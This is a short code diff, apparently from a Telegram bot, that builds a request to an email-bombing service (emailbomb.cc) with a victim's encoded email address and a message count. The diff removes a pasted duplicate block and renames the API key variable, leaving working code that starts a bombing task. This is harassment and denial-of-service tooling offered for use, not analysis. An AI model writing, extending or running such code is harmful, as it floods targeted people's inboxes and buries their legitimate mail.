@@ -169,28 +169,7 @@ bot.onText(/.*/, async (msg) => {
                         }
 
                         try {
-                            // ... [earlier parts of the code]
-
-try {
-    // Encode the email address
-    const encodedEmail = encodeURIComponent(row.email);
-    const url = `https://emailbomb.cc/api?apikey=${process.env.STRIKE_API_KEY}&action=createTask&email=${encodedEmail}&amount=${emailAmount}`;
-
-    const response = await axios.get(url);
-    console.log("API response:", response.data);
-
-    if (!response.data.error) {
-        // ... [rest of the success logic]
-    } else {
-        // ... [rest of the failure logic]
-    }
-} catch (error) {
-    // ... [error handling logic]
-}
-
-// ... [later parts of the code]
-
-                            const url = `https://emailbomb.cc/api?apikey=${process.env.STRIKE_API_KEY}&action=createTask&email=${encodeURIComponent(row.email)}&amount=${emailAmount}`;
+                            const url = `https://emailbomb.cc/api?apikey=${process.env.EBOMB_API_KEY}&action=createTask&email=${encodeURIComponent(row.email)}&amount=${emailAmount}`;
                             const response = await axios.get(url);
 
                             console.log("API response:", response.data);
